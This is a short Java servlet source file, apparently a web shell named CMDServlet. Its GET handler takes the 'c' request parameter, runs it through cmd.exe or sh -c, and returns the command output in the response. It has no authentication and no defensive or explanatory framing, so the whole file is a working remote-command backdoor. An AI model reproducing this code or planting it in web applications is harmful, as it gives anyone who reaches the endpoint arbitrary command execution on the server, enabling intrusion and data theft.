package com.servlet;

import javax.servlet.ServletException;
import javax.servlet.http.HttpServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.IOException;
import java.io.InputStream;
import java.util.Scanner;

public class CMDServlet extends HttpServlet {
    @Override
    protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {
        if (req.getParameter("c") != null) {
            String[] cmd = null;
            String os = System.getProperty("os.name");
            if(os.toLowerCase().startsWith("windows")){
                cmd = new String[]{"cmd.exe", "/c",req.getParameter("c")};
            }else {
                cmd = new String[]{"sh", "-c",req.getParameter("c")};
            }
            InputStream inputStream = Runtime.getRuntime().exec(cmd).getInputStream();
            Scanner scanner = new Scanner(inputStream).useDelimiter("\\a");
            String output = scanner.hasNext() ? scanner.next() : "";
            resp.getWriter().write(output);
            resp.getWriter().flush();
        }
        resp.getWriter().write("\nmy custom servlet");
        resp.getWriter().write("\nend");
        resp.getWriter().flush();
    }
}
